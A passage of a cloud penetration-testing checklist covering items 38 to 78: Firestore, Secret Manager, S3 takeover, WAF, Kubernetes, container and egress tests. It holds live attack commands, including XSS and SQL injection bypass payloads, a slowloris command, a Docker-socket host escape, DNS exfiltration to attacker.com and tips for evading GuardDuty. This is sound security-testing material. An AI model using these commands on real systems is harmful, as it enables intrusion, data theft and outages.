When ipv4Enabled is true AND authorizedNetworks contains 0.0.0.0/0 or your IP. If you can connect directly to the database from the internet, it is critically vulnerable.
Severity: CRITICAL — Direct internet-accessible database; brute-forceable credentials; data exfiltration possible.

39. Test for GCP Firestore Public Access Misconfiguration
Steps:

Check Firestore security rules (via Firebase console or the API):

   curl -H "Authorization: Bearer TOKEN" \
   https://firebaserules.googleapis.com/v1/projects/projectid/releases

Look for rules like allow read, write: if true; or allow read: if true; — these allow public access.
Try reading data without authentication using the Firestore REST API:

   curl https://firestore.googleapis.com/v1/projects/projectid/databases/(default)/documents/collectionname

If you get document data without providing credentials or a Firebase Auth token, the security rules are too permissive.
Also try writing data anonymously:

   curl -X POST https://firestore.googleapis.com/v1/projects/projectid/databases/(default)/documents/testcollection \
   -H "Content-Type: application/json" \
   -d '{"fields":{"test":{"stringValue":"hacked"}}}'
When it is vulnerable:
When you can read or write Firestore documents without authentication. Security rules that say allow read, write: if true are critically misconfigured.
Severity: CRITICAL — Unauthenticated read/write to the entire database; complete data exposure and integrity loss.

40. Test for GCP Secret Manager Secret Access Vulnerability
Steps:

Check if you have a service account with Secret Manager access (via SSRF token, exposed key file, etc.).
List all secrets in the project:

   gcloud secrets list --project projectid

Access a secret value:

   gcloud secrets versions access latest --secret secretname --project projectid

Check the IAM policy of the secret:

   gcloud secrets get-iam-policy secretname

Look for overly broad bindings — allAuthenticatedUsers or the entire project with viewer role on secrets.
Also check if any service accounts have roles/secretmanager.admin or roles/secretmanager.secretAccessor when they should not.

When it is vulnerable:
When you can access secret versions using credentials obtained through another vulnerability (SSRF, exposed key), or when overly broad IAM grants allow unauthorized identities to read secrets.
Severity: CRITICAL — All secrets in the manager (database passwords, API keys, certificates) are exposed.

☁️ GENERAL CLOUD SECURITY TESTS

41. Test for Cloud Storage Bucket DNS Takeover Vulnerability
Steps:

Find subdomains pointing to cloud storage that no longer exist.
Check DNS for CNAME records pointing to storage:

   dig CNAME files.example.com
If it points to files.example.com.s3.amazonaws.com or similar.
3. Check if that S3 bucket actually exists:
   aws s3 ls s3://files.example.com --no-sign-request

If the bucket does not exist (you get NoSuchBucket), it is available for takeover.
Create a bucket with that exact name in any AWS account:

   aws s3 mb s3://files.example.com --region us-east-1

Now upload a test file and confirm files.example.com/testfile is accessible through the subdomain.
Tools like subjack, nuclei, or takeover can automate this discovery.

When it is vulnerable:
When a DNS CNAME points to a cloud storage URL but the bucket/container does not exist. Once you claim the bucket, the subdomain serves your content under the victim's domain.
Severity: HIGH — Subdomain takeover enables phishing, cookie theft (if cookies are scoped to the parent domain), and content injection.

42. Test for Cloud CDN Origin Shield Bypass Vulnerability
Steps:

Identify the CDN in use (CloudFront, Azure CDN, Cloudflare, etc.) and find the origin server.
Look for the origin IP in DNS history (securitytrails.com, shodan.io), certificate transparency logs, or by scanning common regions.
Once you find the origin IP, try direct HTTP/HTTPS requests to it using the victim's Host header:

   curl -H "Host: www.example.com" https://ORIGIN_IP/admin/

Compare responses between CDN and direct origin — if the direct request bypasses WAF rules, you have a bypass.
Check if the origin has IP allow-listing only for CDN IPs — test by sending requests from a non-CDN IP.
Also look for paths that might only be protected by CDN rules but not origin-level auth.

When it is vulnerable:
When you can access the origin server directly and bypass CDN protections (WAF, rate limiting, authentication rules). If the origin accepts requests from your IP without CDN headers, it is vulnerable.
Severity: HIGH — WAF bypass, rate limiting bypass, authentication bypass depending on what is implemented at the CDN layer.

43. Test for Cloud WAF Rule Bypass via Encoding Manipulation
Steps:

First establish a baseline of what the WAF blocks — test common attack payloads:

   curl "https://example.com/?q=<script>alert(1)</script>"
Confirm you get blocked (403 or WAF error page).
2. Now try various encoding techniques to bypass:

URL encoding: %3Cscript%3Ealert(1)%3C/script%3E
Double URL encoding: %253Cscript%253E
Unicode encoding: \u003cscript\u003e
HTML entity encoding: &lt;script&gt;
Base64 (if the app processes it): encoded payload in base64
Mixed case: <ScRiPt>aLeRt(1)</ScRiPt>
Null byte insertion: <scr%00ipt>


For SQL injection bypass:

   ' OR 1=1-- (blocked)
   ' /*!OR*/ 1=1-- (MySQL inline comments)
   ' oR 1=1--
   ' %09OR%09 1=1--

Try each encoding variation and note which ones bypass the WAF.

When it is vulnerable:
When an encoded version of a blocked payload gets through the WAF and is processed by the backend application. If the encoded script tag executes in the browser, or the SQL injection alters query behavior, the WAF is bypassed.
Severity: HIGH — WAF bypass exposes the underlying application to all the attacks the WAF was meant to prevent.

44. Test for Cloud DDoS Protection Bypass via Slow Attack
Steps:

Identify DDoS protection (Cloudflare, AWS Shield, Azure DDoS Protection).
Perform a slow HTTP attack using slowloris:

   slowloris target.com --port 443 --ssl --num-sockets 200

The idea is to open many connections but send requests very slowly, exhausting connection limits without triggering rate-based DDoS protection.
Also try slow POST attacks — open a connection, send headers indicating a large body, then send the body one byte every 10 seconds.
Monitor if the server becomes unresponsive while the attack is ongoing.
Also try HTTP/2 rapid reset attack (modern DDoS technique):
Send many concurrent streams and reset them immediately using HTTP/2 RST_STREAM frames.

When it is vulnerable:
When the server becomes unavailable or response times increase dramatically during the slow attack, and the DDoS protection does not detect and block it. Confirmed if legitimate requests fail while the slow attack is ongoing.
Severity: HIGH — Application availability loss; slow attacks are harder to detect than volumetric floods.

45. Test for Cloud Load Balancer Backend Direct Access
Steps:

Identify backend servers behind the load balancer using IP scanning, DNS history, or error messages that reveal internal IPs.
Try connecting directly to the backend IP:

   curl -H "Host: www.example.com" http://BACKEND_IP/

Check if the backend listens on non-standard ports:

   nmap -p 1-65535 BACKEND_IP

Try accessing the backend without the Host header or with a different host — if it responds with application data, security controls at the LB level are bypassed.
Check if the backend has its own authentication separate from the load balancer's WAF/auth rules.
Look for health check endpoints that are open on the backend but not through the LB.

When it is vulnerable:
When you can directly communicate with the backend and receive application responses that bypass load balancer security policies (WAF rules, SSL termination, authentication).
Severity: HIGH — Security controls implemented at the load balancer layer are completely bypassed.

46. Test for Cloud API Gateway Authentication Bypass
Steps:

Find all API endpoints (Burp Suite, source code analysis, OpenAPI/Swagger docs).
Test each endpoint without authentication headers:

   curl https://api.example.com/v1/users
   curl https://api.example.com/v1/admin

Test with an expired token to see if expiry is validated.
Test with a token from a different user/environment.
Try HTTP method confusion — if GET is restricted, try POST, PUT, PATCH, HEAD.
Try path manipulation:

/api/v1/../v2/admin
/api/v1/users/..%2Fadmin
/api/v1/%2F/admin


Check if the gateway validates all methods or only some (e.g., validates GET but not POST on the same path).
Look for /docs, /swagger.json, /openapi.yaml which might be publicly accessible and reveal all routes.

When it is vulnerable:
When any of these techniques result in a 200 response with data from a protected endpoint. Any successful bypass — whether via missing auth, method confusion, or path traversal — is a vulnerability.
Severity: CRITICAL — Authentication controls protecting the API are rendered ineffective.

47. Test for Cloud Serverless Function Cold Start Information Disclosure
Steps:

Trigger the serverless function in a way that causes a cold start (wait 15+ minutes between invocations so the container terminates).
Monitor the response headers and body for any error messages during cold start.
Look for stack traces, environment variable dumps, or module loading errors.
Try passing invalid or edge-case inputs during the cold start to trigger initialization errors:

   curl -X POST https://func.region.function/endpoint -d '{"invalid": null}'

Compare cold start responses to warm responses — cold starts may have more verbose error handling.
Monitor for timing differences that reveal information about the runtime environment.

When it is vulnerable:
When cold start responses include error messages with internal file paths, environment variable names, dependency versions, or other information not present in warm responses.
Severity: MEDIUM — Information disclosure aids in further attacks by revealing infrastructure details.

48. Test for Cloud Container Registry Public Access Vulnerability
Steps:

Check if the registry is public by trying to pull without credentials:

   docker pull registry.example.com/image:tag

For GCR:

   docker pull gcr.io/projectid/imagename

For ECR, GHCR, etc., similar unauthenticated pull attempts.
If pull succeeds, inspect the image for secrets:

   docker history --no-trunc imagename
   docker inspect imagename
   docker run --rm imagename env
   docker run --rm -it imagename /bin/sh

Extract all layers and search for sensitive files:

   docker save imagename | tar xv
   find . -name "*.env" -o -name "*.key" -o -name "*.pem" -o -name "config.json"
When it is vulnerable:
When you can pull container images without credentials from a registry that should be private. Also vulnerable when pulled images contain secrets in environment variables, build layers, or configuration files.
Severity: HIGH to CRITICAL — Exposes source code, internal infrastructure knowledge, and embedded credentials.

49. Test for Cloud Kubernetes Cluster Public API Access
Steps:

Try to access the Kubernetes API server directly:

   curl https://K8S_API_SERVER_IP:6443/api/v1/namespaces

Check if anonymous access is enabled:

   curl -k https://K8S_API_SERVER_IP:6443/api --header "Authorization: Bearer "

Try listing pods without credentials:

   kubectl --server=https://K8S_API_SERVER_IP:6443 --insecure-skip-tls-verify get pods --all-namespaces

Run a port scan to find the API server:

   nmap -p 6443,8443,443 CLUSTER_IP

Check for the kube-apiserver exposure in Shodan: product:"Kubernetes".
If you can reach the API, check what RBAC is configured and what unauthenticated actions are allowed.

When it is vulnerable:
When the Kubernetes API server is accessible from the internet (port 6443 responds) AND either anonymous access is enabled or no authentication is required. Any successful unauthenticated API call is a critical vulnerability.
Severity: CRITICAL — Full cluster takeover, container escape, cloud credential theft through pod service accounts.

50. Test for Cloud Database Backup Public Access Vulnerability
Steps:

Look for backup files in public storage locations — check S3 buckets, Azure Blob containers, GCS buckets for files ending in .bak, .sql, .dump, .backup, .tar.gz.
Use tools like trufflesecurity/trufflehog or gitleaks on the storage.
Try guessing backup naming conventions: db-backup-YYYY-MM-DD.sql, prod-backup.tar.gz.
Check if automated backup services write to public locations by examining backup policies.
In AWS, check for RDS automated backups and manual snapshots:

   aws rds describe-db-snapshots --snapshot-type public
This lists all PUBLIC snapshots — if yours appear, they are exposed.
6. Try to restore a discovered snapshot to your own account to access the data.
When it is vulnerable:
When describe-db-snapshots --snapshot-type public shows your target's snapshots, or when you find backup files in publicly accessible storage. If you can restore a snapshot or open a backup file, it is critically vulnerable.
Severity: CRITICAL — Complete database content exposure; entire data breach possible from a single backup file.

51. Test for Cloud Log Storage Public Access Misconfiguration
Steps:

Check if log buckets/containers are publicly accessible (apply the S3/Azure/GCS public access tests to logging buckets specifically).
Look for logging buckets with naming conventions like: company-logs, cloudtrail-logs, access-logs, audit-logs.
Try listing and downloading log files without credentials.
If you get access, examine the logs for: IP addresses, user agents, API calls with parameters, authentication tokens in URLs, sensitive data in request bodies.
Look for CloudTrail logs that reveal exactly what API calls were made and by whom.
VPC flow logs reveal network topology and communication patterns.

When it is vulnerable:
When log files are accessible from the public internet without authentication. Even read-only access to logs is a vulnerability because logs often contain sensitive data and aid attackers in understanding the environment.
Severity: HIGH — Log data exposes internal architecture, user activity patterns, and sometimes credentials in request parameters.

52. Test for Cloud Monitoring Dashboard Public Access Exposure
Steps:

Check if Grafana, Kibana, Prometheus, or cloud-native monitoring dashboards are exposed.
Run a scan for common monitoring ports:

   nmap -p 3000,5601,9090,9200 target.com

Try accessing with default credentials:

Grafana: admin/admin
Kibana: no auth by default
Prometheus: no auth by default


Look for dashboards exposed on CDN or behind the main domain: /grafana, /kibana, /prometheus.
Check cloud console for public CloudWatch dashboards, Azure Monitor dashboards set to public.
Try accessing the metrics endpoint directly:

   curl https://target.com/metrics
When it is vulnerable:
When monitoring dashboards are accessible without authentication, or with default credentials. Any dashboard that shows system metrics, error rates, or business metrics is a vulnerability.
Severity: HIGH — Internal architecture, performance baselines, and error patterns revealed; aids in targeted attacks.

53. Test for Cloud Secret Management Service Access Bypass
Steps:

Obtain low-level credentials through any means (SSRF, exposed config, etc.).
Try accessing secret management with those credentials:

   aws secretsmanager list-secrets
   aws secretsmanager get-secret-value --secret-id secretname

Check if the secret resource policies are overly permissive.
Try using the service account/role to access secrets it should not have access to.
Check for secrets accessible via metadata SSRF.
Also test if secrets are cached or logged anywhere (CloudWatch, application logs).

When it is vulnerable:
When credentials from one compromised component can be used to retrieve secrets intended for other components. Also when secret access is not properly scoped (principle of least privilege violated).
Severity: CRITICAL — Cross-component credential access enables lateral movement through the entire application.

54. Test for Cloud Identity Federation Misconfiguration Abuse
Steps:

Find SAML, OIDC, or OAuth federation configurations.
In AWS, check trust policies for roles that use federated identity:

   aws iam get-role --role-name rolename
Look at AssumeRolePolicyDocument for Federated principals.
3. Check if the condition on Federated login is too permissive (e.g., any user from a federated identity provider can assume the role).
4. Test if you can create an identity in the trusted IdP and then assume the AWS/Azure/GCP role.
5. For OIDC providers, check if the aud and sub claims are properly validated in the trust policy.
6. Try to forge or manipulate identity tokens if there is a validation flaw.
When it is vulnerable:
When the federation trust policy allows assumption by any user from the external IdP without restricting to specific groups, emails, or subject claims. If you can create an account in the trusted IdP and gain cloud access, it is vulnerable.
Severity: CRITICAL — External identity provider compromise leads to cloud account compromise.

55. Test for Cloud SSO Configuration Vulnerability Exploitation
Steps:

Identify the SSO provider (Okta, Azure AD, AWS SSO, Google Workspace).
Test for SAML response replay — capture a SAML assertion and try to use it again.
Test for SAML XML signature wrapping attacks — try to inject a second assertion element that overrides the legitimate one.
Check if the SAML response is validated for the correct Audience and Recipient values.
Test for OIDC issues: try using an authorization code twice (replay), or try to exchange a code intended for one client at another client.
Check if SSO permits unverified email login (email address can be claimed by anyone without verification).
Also check for SP-initiated SSO that allows specifying a custom IdP (IdP confusion attack).

When it is vulnerable:
When SAML assertions can be replayed, XML wrapped, or manipulated. When OIDC codes are not single-use. When unverified email claims are trusted for account matching.
Severity: CRITICAL — Full account takeover without knowing the target's password.

56. Test for Cloud MFA Enforcement Bypass for Root/Admin Account
Steps:

Check MFA enforcement policies in AWS:

   aws iam get-account-summary
   aws iam list-virtual-mfa-devices
Check if the root account has MFA: AccountMFAEnabled: 1.
2. Check if there are IAM policies that require MFA for sensitive operations:
   aws iam list-policies --scope Local
Look for policies with condition aws:MultiFactorAuthPresent.
3. Test if API calls using access keys bypass MFA (they do in AWS, which is a design consideration — long-term access keys do not go through MFA).
4. Check if an attacker with the access key and secret can perform sensitive actions without MFA.
5. In Azure, check if Conditional Access policies require MFA and check for exceptions (trusted IPs, legacy auth protocols).
6. Test if legacy authentication protocols (SMTP, IMAP for Exchange Online) bypass MFA enforcement.
When it is vulnerable:
When the root or admin account has no MFA, or when there are bypass conditions (trusted IPs without justification, legacy auth protocols) that let attackers access accounts without MFA.
Severity: CRITICAL — Admin account takeover without MFA challenge is trivial once credentials are obtained.

57. Test for Cloud Resource Tagging Information Disclosure
Steps:

List tags on resources:

   aws resourcegroupstaggingapi get-resources

Look at tag keys and values for sensitive information: environment names, internal project codes, cost center numbers, contact emails, deployment versions.
Also check if tags reveal architecture:

Environment: production on databases
Role: database-master on instances
Tags that reveal internal naming conventions


Check CloudFormation stacks for tags that reveal deployment pipeline information.
Enumerate tags across all resource types to build a map of the infrastructure.

When it is vulnerable:
When tags reveal sensitive internal information (employee names/emails, internal project codes, architecture topology, or environment-specific secrets). Tags that help an attacker map the infrastructure or identify high-value targets are a vulnerability.
Severity: LOW to MEDIUM — Information disclosure that aids reconnaissance for more targeted attacks.

58. Test for Cloud Network Security Group Rule Misconfiguration
Steps:

List all security groups in AWS:

   aws ec2 describe-security-groups

Look for inbound rules with 0.0.0.0/0 or ::/0 as source on sensitive ports:

Port 22 (SSH)
Port 3389 (RDP)
Port 3306 (MySQL)
Port 5432 (PostgreSQL)
Port 27017 (MongoDB)
Port 6379 (Redis)
Port 9200 (Elasticsearch)


In Azure:

   az network nsg list
   az network nsg rule list --nsg-name nsgname --resource-group rgname

Look for rules with sourceAddressPrefix: * on dangerous ports.
Test if the ports are actually reachable:

   nmap -p 22,3306,5432 TARGET_IP
When it is vulnerable:
When management ports (SSH, RDP) or database ports are accessible from 0.0.0.0/0. Confirmed when nmap shows those ports as open and you can initiate a connection.
Severity: CRITICAL — Direct internet access to management and database ports; brute force attacks, exploitation of known CVEs.

59. Test for Cloud Virtual Network Peering Security Gap
Steps:

List VPC peering connections:

   aws ec2 describe-vpc-peering-connections

Check route tables to see what traffic is routed through the peering:

   aws ec2 describe-route-tables

Check if the peering connects to untrusted accounts or VPCs you do not control.
Test if peered VPCs can be used for lateral movement — from a low-trust VPC, try to access resources in the high-trust peered VPC.
Check if security groups properly restrict traffic from peered VPCs or if they use broad CIDR rules.
Look for transitive peering configurations that allow hop-through routing.

When it is vulnerable:
When peering connections exist to accounts/VPCs with weaker security controls, and security groups in the high-value VPC accept connections from the entire peered CIDR range without restriction.
Severity: HIGH — Lateral movement from a compromised low-trust environment to production resources.

60. Test for Cloud Private Endpoint Bypass via Public Access
Steps:

Check if a service has a private endpoint configured:

   aws ec2 describe-vpc-endpoints
Or in Azure:
   az network private-endpoint list

Even with a private endpoint, check if the service still allows public access:

   aws s3api get-bucket-policy --bucket bucketname
Look for conditions on the bucket policy that restrict to VPC endpoints only using aws:sourceVpce condition.
3. If no such condition exists, try accessing the service from outside the VPC (your own IP) even though a private endpoint exists.
4. The private endpoint alone does NOT disable public access to services like S3.
When it is vulnerable:
When a private endpoint is configured but the resource policy does not include a Deny for non-VPC-endpoint access. If you can still reach the service from the public internet despite a private endpoint being set up, the private endpoint is not providing the intended isolation.
Severity: HIGH — The intended network isolation is illusory; public internet access remains open.

61. Test for Cloud Encryption at Rest Key Management Vulnerability
Steps:

Check what encryption keys are used for sensitive data (S3, EBS, RDS, etc.).
Check if AWS-managed keys (aws/s3, aws/ebs) are used instead of Customer Managed Keys (CMK).
For CMKs, check the key policy:

   aws kms get-key-policy --key-id KEY_ID --policy-name default

Look for overly permissive key policies with Principal: "*" or broad account access.
Check key rotation status:

   aws kms get-key-rotation-status --key-id KEY_ID

If KeyRotationEnabled: false, the key never rotates and if compromised stays compromised.
Also check if you can use the key without being the intended service (key policy not restricted to specific services).

When it is vulnerable:
When the key policy allows broad principals to use the key, when rotation is disabled, or when you can call kms:Decrypt with a key intended for a different service. Also vulnerable if AWS-managed keys are used and the account is compromised.
Severity: HIGH — Compromised encryption keys mean all encrypted data is accessible.

62. Test for Cloud Encryption in Transit Certificate Vulnerability
Steps:

Test SSL/TLS configuration:

   testssl.sh https://target.com
Or use sslscan or SSL Labs online test.
2. Check for: weak cipher suites (RC4, DES, 3DES, export ciphers), outdated TLS versions (TLS 1.0, TLS 1.1, SSL 2/3), missing HSTS, certificate validity, certificate chain issues.
3. Check if HTTP (non-HTTPS) is accessible:
   curl http://target.com -v
If it redirects to HTTPS, check if the redirect is 301 permanent.
4. Check for mixed content in the application (HTTPS page loading HTTP resources).
5. Test internal services between cloud components for encrypted transit (e.g., load balancer to backend using HTTP instead of HTTPS).
6. Check if self-signed certificates are used in internal communications (no verification).
When it is vulnerable:
When TLS 1.0/1.1 is supported, weak ciphers are enabled, certificates are invalid/self-signed without proper validation, or when HTTP without redirect is available. Any finding that allows man-in-the-middle attacks is a vulnerability.
Severity: HIGH — Traffic interception between clients and servers; credentials and data exposed in transit.

63. Test for Cloud Audit Logging Disabled for Activity Gap
Steps:

In AWS, check CloudTrail status:

   aws cloudtrail describe-trails
   aws cloudtrail get-trail-status --name trailname
Check IsLogging: true and that the trail covers all regions (IsMultiRegionTrail: true).
2. Check if management events are logged:
   aws cloudtrail get-event-selectors --trail-name trailname

In Azure, check if Azure Monitor Activity Log and Diagnostic Settings are configured.
In GCP, check Cloud Audit Logs:

   gcloud logging sinks list

Confirm the logs are being sent to a secure, centralized location (separate account, SIEM).
Also check if log deletion is protected (S3 bucket versioning + MFA delete, Azure Immutable Storage, GCS retention locks).

When it is vulnerable:
When IsLogging: false in CloudTrail, or when no Activity Log export is configured in Azure, or when GCP Audit Logs are not enabled for sensitive services. Also vulnerable if logs are stored in the same account that could be compromised.
Severity: HIGH — Attackers can operate without detection; no forensic evidence for incident response.

64–100: (Continuing for remaining cloud tests)
64. Test for Cloud Compliance Monitoring Configuration Bypass
Steps:

Check AWS Config rules:

   aws configservice describe-config-rules

Look for rules that should be enabled (S3 public access, root MFA, etc.) and verify they are actually ACTIVE.
Check if compliance monitoring covers all regions:

   aws configservice describe-configuration-recorders
allSupported: true means all resource types are recorded.
4. Test if you can create a non-compliant resource without triggering an alert.
5. Also check if remediations are automated or manual — manual ones create a window of exposure.
When it is vulnerable:
When Config rules do not cover all regions, when critical rules are missing or inactive, or when you can create non-compliant resources without any automated remediation.
Severity: MEDIUM — Compliance violations go undetected, leading to prolonged exposure.

65. Test for Cloud Security Center Alert Suppression Abuse
Steps:

Check existing alert suppression rules in AWS Security Hub, Azure Defender, or GCP Security Command Center.
In AWS:

   aws securityhub get-findings --filters '{"WorkflowStatus":[{"Value":"SUPPRESSED","Comparison":"EQUALS"}]}'

Look for suppressed findings that should not be suppressed.
Check if an attacker with access to Security Hub could suppress their own activity findings.
Verify that suppression rules require appropriate justification and approval.
Look for findings suppressed with very broad filters that catch more than intended.

When it is vulnerable:
When security findings can be suppressed without proper authorization, when suppression rules are overly broad (hiding legitimate alerts), or when an attacker could suppress detection of their malicious activity.
Severity: HIGH — Attacker persistence without detection; security controls appear effective while being circumvented.

66. Test for Cloud GuardDuty / Security Finding Evasion
Steps:

Check if GuardDuty is enabled:

   aws guardduty list-detectors

Test if threat detections fire on known test signatures:

   aws guardduty create-sample-findings --detector-id DETECTOR_ID --finding-types ALL

Check if GuardDuty is configured in all regions.
Test evasion techniques: use legitimate-looking user agents, operate during business hours, use the same credentials from known good IP ranges, use AWS APIs through legitimate SDK calls rather than unusual direct API patterns.
Check if findings are sent to a SIEM and if there are response procedures.
Look for findings with ARCHIVED status that should have been investigated.

When it is vulnerable:
When GuardDuty is disabled, not configured in all regions, or when sample findings do not generate alerts in the SIEM. Also vulnerable if there is no procedure to act on findings.
Severity: HIGH — Malicious activity goes undetected; no response to real attacks.

67. Test for Cloud Configuration Drift Exploitation
Steps:

Identify the baseline configuration (from IaC templates, AWS Config rules, compliance benchmarks).
Check actual current configurations against the baseline:

   aws configservice describe-compliance-by-config-rule

Look for resources that have drifted from their desired state — changes made manually outside of IaC.
In CloudFormation, check for drift:

   aws cloudformation detect-stack-drift --stack-name stackname
   aws cloudformation describe-stack-resource-drifts --stack-name stackname

Drifted resources may have weaker security configurations added manually without review.
Also check if drift detection is automated or has to be manually triggered.

When it is vulnerable:
When stack drift is detected showing that security configurations have been manually weakened (security groups opened, encryption removed, logging disabled). Any drift from a security-relevant baseline is a vulnerability.
Severity: MEDIUM to HIGH — Unauthorized configuration changes may have introduced vulnerabilities that bypass normal change management.

68. Test for Cloud Infrastructure as Code Template Vulnerability
Steps:

Get access to IaC templates (Terraform, CloudFormation, ARM, Pulumi, CDK).
Scan with automated tools:

   checkov -d ./ --framework terraform
   tfsec ./
   cfn_nag scan --input-filename template.yaml

Look for hardcoded secrets:

   grep -r "password\|secret\|key\|token" *.tf *.yaml *.json

Check for overly permissive IAM roles in the templates.
Look for resources with public access allowed (PubliclyAccessible: true, acl: public-read).
Check if logging and encryption are always configured.

When it is vulnerable:
When scanning tools find hardcoded credentials, overly permissive roles, disabled encryption, public access configurations, or disabled logging in IaC templates. These will be deployed exactly as written.
Severity: CRITICAL — Every environment deployed from the template inherits these vulnerabilities at scale.

69. Test for Cloud Deployment Pipeline Secret Exposure
Steps:

Access the CI/CD pipeline configuration files (.gitlab-ci.yml, Jenkinsfile, buildspec.yml, .github/workflows/*.yml).
Look for secrets hardcoded directly in pipeline steps:

   grep -r "password\|secret\|key\|token\|aws_access" .gitlab-ci.yml Jenkinsfile

Check if secrets are properly stored in the pipeline's secret manager (GitLab CI Variables, GitHub Secrets, Jenkins Credentials).
Check if pipeline logs print out environment variables (look for env or printenv commands in pipeline steps).
Check if secret scanning is enabled on the repository.
Access pipeline logs from past runs and look for accidentally printed secrets.

When it is vulnerable:
When secrets appear in plaintext in pipeline configuration files or in pipeline execution logs. Any credential visible in a pipeline log or config file is immediately a critical vulnerability.
Severity: CRITICAL — Credential exposure to everyone with repository or pipeline access.

70. Test for Cloud CI/CD Pipeline Credential Theft
Steps:

Check if the CI/CD system uses short-lived OIDC tokens or long-lived access keys.
For GitHub Actions, check if OIDC is configured properly:

Look at permissions: id-token: write in workflow files
Check the AWS IAM role trust policy restricts to specific repository and branch


Test if environment variables set as pipeline secrets could be exfiltrated by malicious code in a dependency (supply chain attack).
Check if the pipeline agent/runner has overly broad AWS/Azure/GCP permissions.
Verify that pipeline credentials are scoped to the minimum necessary permissions.
Test if forked repository PRs can access secrets from the upstream repository's pipeline.

When it is vulnerable:
When long-lived access keys are used instead of OIDC, when the OIDC trust policy is too broad (any branch/repo can assume the role), or when pipeline permissions are overly broad. Also when fork PRs can trigger pipelines with access to secrets.
Severity: CRITICAL — Attacker gains persistent cloud access through the CI/CD system.

71. Test for Cloud Container Escape via Misconfigured Runtime
Steps:

Check if the container runs as root:

   docker exec CONTAINER_ID id
If uid=0(root), the container runs as root.
2. Check for privileged mode:
   docker inspect CONTAINER_ID | grep -i privileged
"Privileged": true is dangerous.
3. Check for dangerous capability mounts:
   docker inspect CONTAINER_ID | grep -i cap
Look for CAP_SYS_ADMIN, CAP_NET_ADMIN, CAP_SYS_PTRACE.
4. Check if the Docker socket is mounted:
   ls /var/run/docker.sock
If present inside the container, you can escape.
5. If Docker socket is mounted:
   docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host sh

Check if /proc, /sys, or the entire host filesystem is mounted.

When it is vulnerable:
When the container runs as root in privileged mode, when CAP_SYS_ADMIN is granted, or when the Docker socket is mounted. If any of these allow you to execute commands on the host, it is a container escape vulnerability.
Severity: CRITICAL — Full host system compromise from a container breakout.

72. Test for Cloud Pod Security Policy Bypass Vulnerability
Steps:

Check what Pod Security Policies (or Pod Security Admission in K8s 1.25+) are configured:

   kubectl get psp
   kubectl get podsecuritypolicy

Try creating a privileged pod:

yaml   apiVersion: v1
   kind: Pod
   spec:
     containers:
     - name: test
       image: alpine
       securityContext:
         privileged: true

If the pod is created successfully, PSP is not enforcing privilege restrictions.
Try creating a pod with hostNetwork: true, hostPID: true, or hostIPC: true.
Test if you can mount the host filesystem: volumes: [{name: host, hostPath: {path: /}}].
Check if namespaces have the correct labels for Pod Security Admission.

When it is vulnerable:
When you can create privileged pods, pods with host namespace access, or pods with host filesystem mounts without rejection. Each of these enables container escape or information access.
Severity: CRITICAL — Privileged pod creation leads directly to cluster and underlying node compromise.

73. Test for Cloud Service Mesh Authentication Bypass
Steps:

Identify the service mesh (Istio, Linkerd, Consul Connect).
Check if mTLS (mutual TLS) is enforced between services:

   kubectl get peerauthentication -A
   kubectl get destinationrule -A

For Istio, check if the default is STRICT or PERMISSIVE mTLS:
PERMISSIVE means services accept both mTLS and plaintext — plaintext can bypass authentication.
Test by sending a request directly to a service sidecar port without mTLS:

   curl http://SERVICE_IP:8080/api/endpoint
If you get a response, the service accepts plaintext traffic.
5. Check if authorization policies (AuthorizationPolicy) exist and cover all ingress traffic.
6. Check for gaps in AuthorizationPolicy that allow unexpected principals.
When it is vulnerable:
When PeerAuthentication is PERMISSIVE and services accept plaintext requests, or when AuthorizationPolicy is missing, allowing any service to call any other service without identity verification.
Severity: HIGH — Services can be accessed without proper identity, bypassing zero-trust network security.

74. Test for Cloud Ingress Controller Misconfiguration
Steps:

List ingress resources:

   kubectl get ingress -A

Look for ingress rules with host: * (catch-all) that might route unexpected traffic.
Check if the ingress controller exposes an admin interface.
Test if path-based routing can be bypassed:

   curl https://target.com/admin/
   curl https://target.com/%61%64%6d%69%6e/
   curl https://target.com/public/../admin/

Check if the ingress enforces authentication annotations:
Look for nginx.ingress.kubernetes.io/auth-url or similar authentication middleware.
Test if services that should only be internal are accidentally exposed through ingress.

When it is vulnerable:
When path traversal in the URL bypasses ingress rules, when internal services are accidentally exposed, or when authentication middleware is missing on protected paths.
Severity: HIGH — Internal Kubernetes services exposed to the internet; authentication bypasses.

75. Test for Cloud Egress Filtering Bypass for Data Exfiltration
Steps:

Identify the egress filtering in place (Security Groups, NACLs, Firewall Manager, Azure Firewall, GCP Cloud Armor).
Test if you can exfiltrate data through different channels:

DNS: dig attacker.com @8.8.8.8 — DNS tunneling if DNS is allowed but HTTP is blocked
ICMP: ping attacker.com — ICMP can carry data
Alternative ports: try 443, 80, 53, 8080, 8443


Test DNS exfiltration with a tool like dnscat2:
Data can be encoded into DNS subdomain queries that reach an attacker-controlled DNS server.
Check if the egress filtering inspects encrypted (HTTPS) traffic or only blocks by port/IP.
Try tunneling data over allowed protocols (HTTP CONNECT, HTTPS, WebSocket).

When it is vulnerable:
When data can be transmitted out of the cloud environment through any channel that is not inspected or blocked. Even if egress filtering exists, if DNS is unrestricted or HTTPS to any destination is allowed, data exfiltration is possible.
Severity: HIGH — Data exfiltration path remains open; ransomware operators can extract data before encrypting.

76. Test for Cloud Network Address Translation Abuse
Steps:

Identify the NAT Gateway or NAT instance configuration.
Check if the NAT allows traffic from unexpected subnets:

   aws ec2 describe-nat-gateways

Check route tables to see which subnets use the NAT:

   aws ec2 describe-route-tables

Test if private subnets that should NOT have internet access are routed through NAT.
Check if NAT is used to expose internal services to the internet (using DNAT/port forwarding improperly).

When it is vulnerable:
When subnets containing sensitive resources (databases, internal services) have routes to the NAT gateway, giving them unintended internet access through which they could initiate connections or be reachable.
Severity: MEDIUM — Unintended internet connectivity for sensitive internal resources.

77. Test for Cloud DHCP Option Set Manipulation Vulnerability
Steps:

Check DHCP options configured in the VPC:

   aws ec2 describe-dhcp-options

Look at domain-name-servers — if it points to a custom DNS server, check who controls that server.
If DHCP is pointing to an attacker-controlled DNS server, DNS responses can be manipulated (DNS poisoning at the network level).
Check if the DHCP options were changed recently (CloudTrail for CreateDhcpOptions, AssociateDhcpOptions events).
Look for domain-name settings that could cause DNS search path issues.

When it is vulnerable:
When DHCP options point to untrusted or uncontrolled DNS servers, enabling DNS-level manipulation of all name resolution within the VPC. If a malicious server was configured, all instances in the VPC resolve domain names through it.
Severity: HIGH — Network-wide DNS manipulation; redirect all traffic including API calls to attacker-controlled servers.

78. Test for Cloud VPC Endpoint Policy Bypass Vulnerability
Steps:

List VPC endpoint policies:

   aws ec2 describe-vpc-endpoints

